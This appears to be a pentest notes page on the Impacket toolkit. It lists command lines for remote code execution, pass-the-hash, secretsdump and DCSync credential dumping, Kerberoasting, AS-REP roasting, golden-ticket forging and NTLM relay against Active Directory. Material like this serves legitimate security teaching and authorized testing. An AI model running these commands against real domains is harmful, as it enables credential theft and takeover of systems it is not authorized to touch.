# Impacket

Impacket is a collection of Python classes and ready-to-run scripts for working with Windows network protocols (SMB, MSRPC, Kerberos, LDAP, and more). It is the backbone of [Active Directory](../Active%20Directory/Active%20Directory%20Basics.md) attacks - credential dumping, remote command execution, ticket abuse, and relaying all run through Impacket scripts.

## Install

```bash
pipx install impacket
# scripts are prefixed impacket- on Kali (e.g. impacket-secretsdump)
```

## Remote command execution

```bash
impacket-psexec domain/user:'Password1'@10.0.0.5     # SYSTEM shell (noisy)
impacket-wmiexec domain/user:'Password1'@10.0.0.5    # quieter, WMI
impacket-smbexec domain/user:'Password1'@10.0.0.5
impacket-atexec domain/user:'Password1'@10.0.0.5 whoami

# With a hash instead of a password (Pass-the-Hash)
impacket-wmiexec -hashes :<NThash> administrator@10.0.0.5
```

## Credential dumping

```bash
# Remote SAM/LSA/NTDS dump (DCSync when run against a DC)
impacket-secretsdump domain/user:'Password1'@10.0.0.1
impacket-secretsdump -just-dc-user krbtgt domain/user:'Password1'@10.0.0.1
```

## Kerberos attacks

```bash
# Kerberoasting - request service tickets for cracking
impacket-GetUserSPNs domain/user:'Password1' -dc-ip 10.0.0.1 -request

# AS-REP roasting - users with "no preauth"
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.0.0.1

# Golden/Silver ticket forging and pass-the-ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local administrator
```

## Relay and MITM

```bash
impacket-ntlmrelayx -t ldap://10.0.0.1 --delegate-access   # see NTLM Relay
```

## Tips

- Feed the hashes you dump to [Hashcat](Hashcat.md) (modes 13100 / 18200 for Kerberos).
- [NetExec](NetExec.md) wraps a lot of this for scale; Impacket is the surgical tool.
- Keep SIDs, hashes, and tickets organized - these scripts chain together.

## Resources

- [Impacket on GitHub](https://github.com/fortra/impacket)
- [NTLM Relay](../Active%20Directory/NTLM%20Relay.md), [DCSync](../Active%20Directory/DCSync.md), [Kerberoasting](../Active%20Directory/Kerberoasting.md)
